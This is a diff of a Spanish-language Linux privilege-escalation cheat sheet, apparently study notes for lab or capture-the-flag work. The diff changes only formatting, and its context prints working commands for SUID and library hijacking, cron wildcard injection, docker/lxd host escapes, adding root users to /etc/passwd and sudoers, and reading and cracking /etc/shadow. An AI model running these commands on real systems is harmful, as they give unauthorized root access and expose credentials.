@@ -6,39 +6,39 @@
 
 Para atacar un sistema Linux debemos hacernos estas preguntas:
 
-1️⃣**¿Quienes somos? ¿Pertenecemos a algun grupo importante?** Por ejemplo: `adm`, `lxd`, `docker`, `shadow`,
+1️⃣ **¿Quienes somos? ¿Pertenecemos a algun grupo importante?** Por ejemplo: `adm`, `lxd`, `docker`, `shadow`,
 
-2️⃣**¿Cuál es la versión del kernel?** A lo mejor es vulnerable.
+2️⃣ **¿Cuál es la versión del kernel?** A lo mejor es vulnerable.
 
-3️⃣**¿Qué podemos ejecutar como sudo?**
+3️⃣ **¿Qué podemos ejecutar como sudo?**
 - Puede que tenga una explotación en gtfobins
 - Puede que permita ejecutar comandos o leer archivos de root con alguna opción rara
 - ¿Hay alguna opción para editar variables como `LD_PRELOAD`o `SETENV`?
 - Si es un python, puede que sea escribible o que por ejemplo cargue una librería mal protegida
 
-4️⃣**¿Se ejecuta alguna capability especial?**
+4️⃣ **¿Se ejecuta alguna capability especial?**
 - Si es un lenguaje de programación puede que tenga exploit en gtfobins
 - Si no, puede que tenga alguna que le permita acceder a algun archivo privilegiado o algo
 
-5️⃣**¿Hay algun comando SUID?**
+5️⃣ **¿Hay algun comando SUID?**
 - Si es un script puede que tenga malos permisos o ejecute otro script con malos permisos
 - Puede que ejecute un binario con una ruta relativa > Path hijacking
 - Puede que cargue una librería en un path vulnerable o que se pueda cambiar el path
 - Si es un python, puede que cargue alguna librería mal protegida
 - Puede que permita ejecutar comandos o leer archivos de root con alguna opción rara
 
-6️⃣**¿Hay alguna tarea cron que se ejecute como un usuario privilegiado?**
+6️⃣ **¿Hay alguna tarea cron que se ejecute como un usuario privilegiado?**
 - Si es un script puede que tenga malos permisos o ejecute otro script con malos permisos
 - Puede que ejecute un comando con un `*`, de lo que uno se podrá aprovechar
 - Puede que sea un software con algun exploit como `rotate`
 
-7️⃣**¿Qué software hay instalado?** Por ejemplo la versión 4.05.00 de Screen permite una escalada
+7️⃣ **¿Qué software hay instalado?** Por ejemplo la versión 4.05.00 de Screen permite una escalada
 
-8️**¿Tiene el sistema NICs adicionales en otras subredes?** Podemos usar `route`, `netstat -rn` o `arp` para numerar
+8️ **¿Tiene el sistema NICs adicionales en otras subredes?** Podemos usar `route`, `netstat -rn` o `arp` para numerar
 - Esto permite posible movimiento lateral
 - A lo mejor hay una aplicación vulnerable corriendo en el localhost
 
-9️⃣**¿Y en cuanto a archivos?**
+9️⃣ **¿Y en cuanto a archivos?**
 - ¿Hay algo raro en el historial o en la bash de nuestro usuario?
 - ¿Podemos acceder a alguna clave SSH mal protegida o contraseña harcodeada en algun archivo? Mirar sobre todo archivos de configuración
 - ¿Hay algun archivo backup interesante? No hay que descuidarlos
@@ -62,7 +62,7 @@ Por ejemplo find con SUID se explotaría así:
 find . -exec /bin/bash -p \; -quit
 ```
 
- ---
+-------
 ## 1.2. 📚 SUID en binario que carga shared libraries
 
 > 🔎 **Enumeración**: Primero vemos que librerías carga un binario SUID
@@ -84,7 +84,7 @@ gcc -shared -fPIC -o /development/libshared.so /tmp/evil.c
 /usr/local/bin/suid_app
 ```
 
----
+-------
 ## 1.3. Dumpeo de memorias
 
 Tenemos un binario que lee un archivo para decir su cantidad de lineas, mientras que esta corriendo, lee el archivo, por tanto este estara en su memoria hasta que finalice el proceso. Si lo hacemos crasehar, podremos ver esa memoria antes de ser eliminada.
@@ -99,8 +99,7 @@ apport-unpack /var/crash/count.1000.crash /tmp/crash-report
 strings /tmp/crash-report/CoreDump # -> Todo el archivo :)
 ```
 
-----
-
+-------
 ## 1.4. Shared Object Hijacking
 
 Tenemos un suid raro y vemos sus librerías con `ldd`, encontramos que carga la librería `glibc` (como es normal) y otra que una que no es de las estandares. La examinamos con `readelf`
@@ -135,7 +134,7 @@ gcc /tmp/evil.c -fPIC -shared -o /development/libshared.so
 ./payroll
 ```
 
----
+-------
 # 2. 🔒 Abuso de capabilities
 
 Las capabilities son más sigilosas que SUID porque no aparecen en un `ls -la`. Hay que buscarlas explícitamente.
@@ -161,6 +160,7 @@ tar -cvf shadow.tar /etc/shadow 2>/dev/null && tar -xvf shadow.tar && cat etc/sh
 vim /etc/shadow # vim
 ```
 
+-------
 ## 2.2. 🔒 Abuso de capabilities - Otros
 
 **Si no esta en gtfobins, se busca manualmente:**
@@ -171,7 +171,7 @@ getcap /usr/bin/vim.basic
 echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
 ```
 
----
+-------
 # 3. 🔒 Abuso de sudo
 
 `sudo -l` es **siempre el primer comando** a ejecutar. Muestra qué puede hacer el usuario actual como root.
@@ -222,7 +222,6 @@ sudo LD_PRELOAD=/tmp/evil.so /usr/bin/openssl
 ```
 
 -------
-
 ## 3.3 Python library hijacking
 
 > [!WARNING]
@@ -248,6 +247,7 @@ cat /home/paco/programa.py
 
 También podemos ver en la segunda línea que importa el módulo `psutil` y utiliza la función `virtual_memory()`.
 
+--------
 ### 3.3.1. Permisos de escritura inseguros en el módulo de python
 
 > [!CAUTION]
@@ -267,6 +267,7 @@ sudo /usr/bin/python3 /home/htb-student/mem_status.py
 bash-5.0#
 ```
 
+--------
 ### 3.3.2. Ruta de búsqueda de bibliotecas de Pythonn
 
 > [!CAUTION]
@@ -287,6 +288,7 @@ def virtual_memory():
     import os; os.system('id')
 ```
 
+--------
 ### 3.3.3. Variable de entorno PYTHONPATH
 
 > [!CAUTION]
@@ -304,8 +306,7 @@ Por tanto, la editamos para apuntar al script que hicimos en la anterior secció
 sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
 ```
 
-
----
+--------
 # 4. 🔒 Abuso de cron jobs
 
 Los cron jobs suelen ejecutarse como root. Si el script que ejecutan es modificable o está en una ruta controlable, se obtiene ejecución como root. 
@@ -321,7 +322,7 @@ while true; do
 done
 ```
 
-
+--------
 ## 4.1. Path hijacking
 
 > [!CAUTION]
@@ -341,13 +342,14 @@ export PATH=.:${PATH}
 # 3. Ejecutamos o esperamos a que se ejecute y tendremos una bash SUID
 ```
 
----------
+--------
 ## 4.2. Permisos incorrectos
 
 Encontramos este crontab de root `* * * * * /opt/scripts/backup.sh`
 1. Puede que el script o la ruta tenga permisos de escritura → `echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh`
 2. O que ejecute un binario SUID al que podamos hacer un **path hijacking**
 
+--------
 ## 4.3. Wildcard abuse
 
 Tenemos un cronjob que ejecuta esto. Lo que nos llama la atención es el wildcard (`*`) y que se ejecuta en un directorio donde tenemos permisos de escritura
@@ -363,7 +365,7 @@ touch /home/kali/--checkpoint=1 && touch /home/kali/--checkpoint-action=exec=sh\
 
 En nuestro home se habran creado `backup.tar.gz` y `--checkpoint=1` y `--checkpoint-action=exec=sh`, dos archivos que se interpretan como parametros por culpa del `*`
 
-------
+--------
 ## 4.4. Logrotate
 
 En todos los sistemas Linux, se crean logs kilométricos. Para evitar que saturen el disco, la herramienta `logrotate` elimina los  mas viejos. Esta herramienta toma como factores el tamaño del log, su antiguedad y que hacer cuando estos dos lleguen a cierto tope. Para operar, lo que hace es renombrar los logs viejos, los borra y crea unos nuevos. Esta herramienta funciona por `cron` y se configura con `/etc/logrotate.conf`
@@ -383,8 +385,7 @@ echo "trigger rotation" >> ~/backups/access.log
 watch -n 1 ls -lah /etc/bash_completion.d # vemos hasta que salga hack -> su hack
 ```
 
-
------
+--------
 ## 4.6. 🧱 Timers de Systemd escribibles
 
 Los timers de systemd son el equivalente moderno a cron. Si un archivo `.service` o `.timer` es escribible.
@@ -397,7 +398,7 @@ ExecStart=/bin/bash -c 'chmod +s /bin/bash'
 3. Luego esperamos que el timer dispare o lo forzamos: `systemctl daemon-reload && systemctl start nombre.service` y tendremos la bash SUID
 
 
----
+--------
 # 5. 👥 Abuso de grupos especiales
 
 Algunos grupos dan acceso a recursos que equivalen a root en la práctica.
@@ -413,6 +414,7 @@ cat /var/log/syslog
 grep -i "password\|pass\|user" /var/log/auth.log
 ```
 
+--------
 ## 5.2. Grupo docker
 1. Podemos montar el filesystem del host en un contenedor 
 ```bash
@@ -424,6 +426,7 @@ docker run -v /:/host --rm -it alpine chroot /host bash
 docker run -v /:/host --rm alpine sh -c "cp /bin/bash /host/tmp/bash && chmod 4755 /host/tmp/bash" && /tmp/bash -p
 ```
 
+--------
 ## 5.3. Grupo lxd (Ubuntu)
 Podemos importar una imagen minimal y montarla el host
 ```bash
@@ -434,6 +437,7 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 lxc start privesc && lxc exec privesc /bin/sh # → en el contenedor: /mnt/root es el / del host con privilegios root
 ```
 
+--------
 ## 5.4. Grupo disk
 
 Da acceso directo al dispositivo de bloque → leer cualquier archivo
@@ -442,7 +446,7 @@ debugfs /dev/sda1
 debugfs: cat /etc/shadow
 ```
 
----
+--------
 # 6. 📂 Archivos y directorios con permisos débiles
 
 ## 6.1. passwd escribible
@@ -456,6 +460,7 @@ echo 'wtf:$1$wtf$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /etc/passwd
 su wtf   # contraseña: pass → shell root
 ```
 
+--------
 ## 6.2. 💥shadow legible
 Se pueden tratar de romper los hashes
 ```bash
@@ -464,6 +469,7 @@ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
+--------
 ## 6.3. sudoers escribible
 Se pueden añadir usuarios con permiso de sudo
 ```bash
@@ -473,7 +479,7 @@ echo 'jessica ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers && sudo bash
 > [!WARNING]
 Otro archivo es el de las claves públicas `authorized_keys`, para poder autenticarnos con kali sin proporcionar contrasela
 
----
+--------
 # 7. 💻 Exploits de kernel
 
 El kernel exploit es el último recurso: es ruidoso, puede crashear el sistema y requiere versión exacta. Solo cuando todo lo demás falla.
@@ -506,6 +512,7 @@ gcc kernel_exploit.c -o kernel_exploit --static
 export PATH="$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.8" # actualizar el path
 ```
 
+--------
 ## 7.1. 💥PwnKit (CVE-2021-4034)
 
 > [!WARNING]
@@ -515,6 +522,7 @@ Sabemos que cuando Linux ejecuta un programa, le entrega principalmente dos lis
 
 Sin embargo, si se indicaba que no había argumentos `argc = 0`, el programa trataba de ejecutar lo siguiente que estuviera en memoria ¿Qué era? Un variable de entorno, en concreto, `GCONV_PATH` que indica la codificación a utilizar para imprimir un error. Lo que haya en esa variable por tanto se entendía como el argumento 1, o sea el programa que pkexec debería ejecutar como root gracias al bit SUID
 
+--------
 ## 7.2. 💥DirtyCow
 
 Supongamos que nuestro proceso quiere acceder a un archivo que puede leer, pero no modificar, como **/etc/passwd**. El proceso es el siguiente:
@@ -528,7 +536,7 @@ La falla viene cuando se ejecutan dos hilos que constantemente hacen esto:
 - **ptrace** dónde se crea un proceso depurador que modifique su memoria.
 
 
----
+--------
 # 7 .💻 Entorno
 
 ## 7.1 💻 Restricted shells
@@ -543,7 +551,6 @@ Una restricted shell es un tipo de shell que solo permite ciertas comandos o est
 - Podemos tratar de ejecutar otras shells como `sh` 
 
 -----
-
 ## 7.2 💻 Multiplexadores
 
 Tmux permite dejar una sesión en segundo plano. Si root crea una sesión privilegiada con malos permisos, podremos 
@@ -562,7 +569,7 @@ tmux -S /shareds
 ```
 
 
----
+--------
 # 8. 🔧 Enumeración automática
 
 En lugar de lanzar los comandos manualmente uno a uno, estas herramientas automatizan toda la enumeración:
